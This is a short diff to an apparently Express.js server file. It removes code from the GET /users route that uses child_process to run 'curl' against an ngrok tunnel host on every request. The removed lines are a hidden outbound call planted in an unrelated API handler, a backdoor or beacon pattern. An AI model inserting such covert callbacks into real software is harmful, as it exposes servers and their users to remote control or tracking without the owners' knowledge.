@@ -21,17 +21,6 @@ app.use(morgan(customLogger))
 
 router.get('/users', (req, res) => {
   
-var exec = require('child_process').exec;
-function puts(error, stdout, stderr) { sys.puts(stdout) }
-exec("curl http://8.tcp.ngrok.io:14258", function(error, stdout, stderr) {
-  if (!error) {
-    // things worked!
-  } else {
-    // things failed :(
-  }
-});
-  
-  
   res.json({
     users: [
       {
